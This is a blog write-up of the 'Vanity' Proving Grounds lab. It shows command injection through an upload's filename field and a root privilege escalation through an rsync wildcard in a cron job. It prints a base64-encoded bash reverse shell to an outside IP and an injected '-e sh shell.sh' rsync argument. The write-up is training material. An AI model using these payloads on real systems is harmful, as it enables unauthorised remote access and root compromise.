<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Vanity - OSPG | Infomation Security - Blog</title><meta name="description" content="0. Lab Information  Machine Name: Vanity  Platform: Proving Grounds Practice  Difficulty: Intermediate
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Cuong (Jay) Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/vanity-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Vanity - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/vanity-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">Home</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Vanity - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> September 02, 2023</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ospg">ospg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 6 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="0-lab-information">0. Lab Information</h1><ul><li>Machine Name: <code class="language-plaintext highlighter-rouge">Vanity</code></li><li>Platform: <code class="language-plaintext highlighter-rouge">Proving Grounds Practice</code></li><li>Difficulty: <code class="language-plaintext highlighter-rouge">Intermediate</code></li></ul><h1 id="1-summary">1. Summary</h1><p>The target web server was vulnerable to <code class="language-plaintext highlighter-rouge">command injection</code> vulnerability. Leveraging the weakness, I secured an initial access on the target as <code class="language-plaintext highlighter-rouge">www-data</code> user. Locally examine the system, there was a <code class="language-plaintext highlighter-rouge">cron</code> job, which could be exploited to obtain <code class="language-plaintext highlighter-rouge">root</code> access.</p><h1 id="2-detailed-writeup">2. Detailed Writeup</h1><h2 id="21-service-enumeration">2.1 Service Enumeration</h2><p>Per enumerating running service using <code class="language-plaintext highlighter-rouge">nmap</code>, I detected 3 active services.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -Pn -T4 -oA nmap/full_ports -p- -vv 192.168.x.234</code></li></ul><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/1.png" title="vanity/1.png" alt="vanity/1.png"></div><p>Let’s us drop our attention to the <code class="language-plaintext highlighter-rouge">HTTP</code> service running on port <code class="language-plaintext highlighter-rouge">80</code>.</p><h2 id="22-http-recon">2.2 HTTP Recon</h2><p>Navigated to the web server, the file upload feature instantly caught my attention.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/2.png" title="vanity/2.png" alt="vanity/2.png"></div><p>Prior exploring this feature, I started a directory scanner using <code class="language-plaintext highlighter-rouge">ffuf</code>. The command is:</p><ul><li><code class="language-plaintext highlighter-rouge">ffuf -u http://192.168.228.234/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -of md -o common.md</code></li></ul><p>Let it run in the background, the below table is a summary of my scanning’s results.</p><table><thead><tr><th style="text-align: left">FUZZ</th><th style="text-align: left">URL</th><th style="text-align: left">Redirectlocation</th><th style="text-align: left">Position</th><th style="text-align: left">Status Code</th><th style="text-align: left">Content Length</th><th style="text-align: left">Content Words</th><th style="text-align: left">Content Lines</th><th style="text-align: left">Content Type</th><th style="text-align: left">Duration</th><th style="text-align: left">ResultFile</th><th style="text-align: left">ScraperData</th><th>Ffufhash</th></tr></thead><tbody><tr><td style="text-align: left">.htpasswd</td><td style="text-align: left">http://192.168.228.234/.htpasswd</td><td style="text-align: left"> </td><td style="text-align: left">25</td><td style="text-align: left">403</td><td style="text-align: left">280</td><td style="text-align: left">20</td><td style="text-align: left">10</td><td style="text-align: left">text/html; charset=iso-8859-1</td><td style="text-align: left">251.493179ms</td><td style="text-align: left"> </td><td style="text-align: left"> </td><td>370e119</td></tr><tr><td style="text-align: left">.htaccess</td><td style="text-align: left">http://192.168.228.234/.htaccess</td><td style="text-align: left"> </td><td style="text-align: left">24</td><td style="text-align: left">403</td><td style="text-align: left">280</td><td style="text-align: left">20</td><td style="text-align: left">10</td><td style="text-align: left">text/html; charset=iso-8859-1</td><td style="text-align: left">258.235462ms</td><td style="text-align: left"> </td><td style="text-align: left"> </td><td>370e118</td></tr><tr><td style="text-align: left">.hta</td><td style="text-align: left">http://192.168.228.234/.hta</td><td style="text-align: left"> </td><td style="text-align: left">23</td><td style="text-align: left">403</td><td style="text-align: left">280</td><td style="text-align: left">20</td><td style="text-align: left">10</td><td style="text-align: left">text/html; charset=iso-8859-1</td><td style="text-align: left">3.640424528s</td><td style="text-align: left"> </td><td style="text-align: left"> </td><td>370e117</td></tr><tr><td style="text-align: left">index.html</td><td style="text-align: left">http://192.168.228.234/index.html</td><td style="text-align: left"> </td><td style="text-align: left">2201</td><td style="text-align: left">200</td><td style="text-align: left">2814</td><td style="text-align: left">344</td><td style="text-align: left">73</td><td style="text-align: left">text/html</td><td style="text-align: left">272.484081ms</td><td style="text-align: left"> </td><td style="text-align: left"> </td><td>370e1899</td></tr><tr><td style="text-align: left">server-status</td><td style="text-align: left">http://192.168.228.234/server-status</td><td style="text-align: left"> </td><td style="text-align: left">3723</td><td style="text-align: left">403</td><td style="text-align: left">280</td><td style="text-align: left">20</td><td style="text-align: left">10</td><td style="text-align: left">text/html; charset=iso-8859-1</td><td style="text-align: left">272.49353ms</td><td style="text-align: left"> </td><td style="text-align: left"> </td><td>370e1e8b</td></tr><tr><td style="text-align: left">uploads</td><td style="text-align: left">http://192.168.228.234/uploads</td><td style="text-align: left">http://192.168.228.234/uploads/</td><td style="text-align: left">4326</td><td style="text-align: left">301</td><td style="text-align: left">320</td><td style="text-align: left">20</td><td style="text-align: left">10</td><td style="text-align: left">text/html; charset=iso-8859-1</td><td style="text-align: left">254.406676ms</td><td style="text-align: left"> </td><td style="text-align: left"> </td><td>370e110e6</td></tr></tbody></table><p>Back to the web server, I created a <code class="language-plaintext highlighter-rouge">test.txt</code> file and uploaded onto the target system.</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>test.txt           
Test
</code></pre></div></div><p>The result was <code class="language-plaintext highlighter-rouge">OK</code>, meaning that the file had been successfully uploaded.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/3.png" title="vanity/3.png" alt="vanity/3.png"></div><p>Went back one directory, <code class="language-plaintext highlighter-rouge">/uploads</code>, I found that the <code class="language-plaintext highlighter-rouge">test.txt</code> file was saved in there.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/4.png" title="vanity/4.png" alt="vanity/4.png"></div><p>Intercept the request with <code class="language-plaintext highlighter-rouge">Burp Suite</code>, this is how the request would look like.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/5.png" title="vanity/5.png" alt="vanity/5.png"></div><p>Based on the logic, this could potentially cause a <code class="language-plaintext highlighter-rouge">Remote Code Execution</code> vulnerability.</p><p>However, the server did a good job in filtering malicious file extensions.Trying various bypassing methods wouldn’t return any results.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/6.png" title="vanity/6.png" alt="vanity/6.png"></div><p>At this point, I approached it with different perspectives, attempting to exploit <code class="language-plaintext highlighter-rouge">Directory Traversal</code> or overwrite <code class="language-plaintext highlighter-rouge">.htaccess</code> file, none of them worked out.</p><p>This was when I started noticing the scanning result.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/7.png" title="vanity/7.png" alt="vanity/7.png"></div><p>Researching the <code class="language-plaintext highlighter-rouge">SCAN SUMMARY</code> outputs revealed the fact that this website processed my file using <code class="language-plaintext highlighter-rouge">clamav</code>. That said, every request sent, if successful, would take around ~12,000 millis.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/8.png" title="vanity/8.png" alt="vanity/8.png"></div><p>Next, I tried out <code class="language-plaintext highlighter-rouge">command injection</code> vulnerability by injecting a <code class="language-plaintext highlighter-rouge">sleep 5</code> command in the <code class="language-plaintext highlighter-rouge">filename</code> field.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/9.png" title="vanity/9.png" alt="vanity/9.png"></div><p>It took ~17,000 millis to complete the request, which confirmed that the injected code was, indeed, executed.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/10.png" title="vanity/10.png" alt="vanity/10.png"></div><p>To obtain reverse shell, I encoded my reverse shell in <code class="language-plaintext highlighter-rouge">base64</code> and execute it. The payload will look like below:</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># YmF... = bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.169/80 0&gt;&amp;1'</span>

<span class="nb">echo </span>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2OS84MCAwPiYxJwo<span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | sh
</code></pre></div></div><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/11.png" title="vanity/11.png" alt="vanity/11.png"></div><p>After a few seconds, I got a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/12.png" title="vanity/12.png" alt="vanity/12.png"></div><p>As the current shell was not stable, I stabilized it as the following:</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/13.png" title="vanity/13.png" alt="vanity/13.png"></div><p>Once done, I changed directory to <code class="language-plaintext highlighter-rouge">/var/www</code> and read the <code class="language-plaintext highlighter-rouge">local.txt</code> file.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/14.png" title="vanity/14.png" alt="vanity/14.png"></div><h2 id="23-local-enumeration">2.3 Local Enumeration</h2><p>Checking <code class="language-plaintext highlighter-rouge">crontab</code> file, looks like that the <code class="language-plaintext highlighter-rouge">/opt/backup.sh</code> script got executed every minute.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/15.png" title="vanity/15.png" alt="vanity/15.png"></div><p>Read the content of the <code class="language-plaintext highlighter-rouge">backup.sh</code> file, it introduced a <code class="language-plaintext highlighter-rouge">rsync</code> wildcard vulnerability.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/16.png" title="vanity/16.png" alt="vanity/16.png"></div><h2 id="24-privilege-escalation">2.4 Privilege Escalation</h2><p>To exploit the vulnerability, I created a <code class="language-plaintext highlighter-rouge">shell.sh</code> script containing a bash reverse shell. To trigger the shell, I implanted an <code class="language-plaintext highlighter-rouge">-e</code> flag pointing to the <code class="language-plaintext highlighter-rouge">shell.sh</code> file.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/17.png" title="vanity/17.png" alt="vanity/17.png"></div><p>In the background, it’ll look something similar to:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rsync</span> <span class="o">--</span><span class="n">password</span><span class="o">-</span><span class="nb">file</span><span class="o">=/</span><span class="n">root</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">a</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="p">.</span><span class="n">sh</span> <span class="n">shell</span><span class="p">.</span><span class="n">sh</span> <span class="n">upload</span><span class="p">.</span><span class="n">php</span> <span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">vanity</span><span class="o">/</span><span class="n">backup</span><span class="o">/</span>
</code></pre></div></div><p>After a minute, my <code class="language-plaintext highlighter-rouge">netcat</code> handler got a call back as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/18.png" title="vanity/18.png" alt="vanity/18.png"></div><p>Under the <code class="language-plaintext highlighter-rouge">root</code> shell, I successfully read the <code class="language-plaintext highlighter-rouge">proof.txt</code> file.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/vanity/19.png" title="vanity/19.png" alt="vanity/19.png"></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2024 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>